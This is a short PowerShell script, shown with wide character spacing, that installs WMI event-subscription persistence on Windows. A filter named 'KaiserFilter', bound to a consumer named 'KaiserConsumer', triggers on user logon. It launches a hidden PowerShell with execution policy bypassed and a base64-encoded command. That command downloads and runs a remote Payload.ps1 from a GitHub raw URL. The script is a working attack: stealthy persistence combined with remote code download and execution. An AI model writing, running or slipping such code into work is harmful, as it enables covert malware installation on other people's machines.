$ c m d   =   " C : \ W i n d o w s \ S y s t e m 3 2 \ W i n d o w s P o w e r S h e l l \ v 1 . 0 \ p o w e r s h e l l . e x e   - n o p   - w   H i d d e n    e p   B y p a s s   - e n c   a Q B l A H g A I A A o A E 4 A Z Q B 3 A C 0 A T w B i A G o A Z Q B j A H Q A I A B O A G U A d A A u A F c A Z Q B i A E M A b A B p A G U A b g B 0 A C k A L g B E A G 8 A d w B u A G w A b w B h A G Q A U w B 0 A H I A a Q B u A G c A K A A i A G g A d A B 0 A H A A c w A 6 A C 8 A L w B y A G E A d w A u A G c A a Q B 0 A G g A d Q B i A H U A c w B l A H I A Y w B v A G 4 A d A B l A G 4 A d A A u A G M A b w B t A C 8 A T g B 0 A F I A Y Q B p A H M A Z Q B I A G E A c g B k A E U A c g B y A G 8 A c g A v A E s A Y Q B p A H M A Z Q B y A C 8 A S w B h A G k A c w B l A H I A R A B v A H c A b g B s A G 8 A Y Q B k A G U A c g B U A G U A c w B 0 A C 8 A U A B h A H k A b A B v A G E A Z A A u A H A A c w A x A C I A K Q A = " 
 
 $ f i l t e r N a m e = ' K a i s e r F i l t e r '  
  
 $ c o n s u m e r N a m e = ' K a i s e r C o n s u m e r '  
  
 $ Q u e r y = " S E L E C T   *   F R O M   _ _ I n s t a n c e C r e a t i o n E v e n t   W I T H I N   1 0   W H E R E   T a r g e t I n s t a n c e   I S A   ' W i n 3 2 _ L o g g e d O n U s e r ' "  
  
 $ W M I E v e n t F i l t e r = S e t - W m i I n s t a n c e   - C l a s s   _ _ E v e n t F i l t e r   - N a m e S p a c e   " r o o t \ s u b s c r i p t i o n "   - A r g u m e n t s   @ { N a m e = $ f i l t e r N a m e ;   E v e n t N a m e S p a c e = " r o o t \ c i m v 2 " ;   Q u e r y L a n g u a g e = " W Q L " ;   Q u e r y = $ Q u e r y }  
  
 $ W M I E v e n t C o n s u m e r = S e t - W m i I n s t a n c e   - C l a s s   C o m m a n d L i n e E v e n t C o n s u m e r   - N a m e s p a c e   " r o o t \ s u b s c r i p t i o n "   - A r g u m e n t s   @ { N a m e = $ c o n s u m e r N a m e ;   C o m m a n d L i n e T e m p l a t e = $ c m d }  
  
 S e t - W m i I n s t a n c e     - C l a s s   _ _ F i l t e r T o C o n s u m e r B i n d i n g     - N a m e s p a c e   " r o o t \ s u b s c r i p t i o n "     - A r g u m e n t s   @ { F i l t e r = $ W M I E v e n t F i l t e r ;   C o n s u m e r = $ W M I E v e n t C o n s u m e r }  
 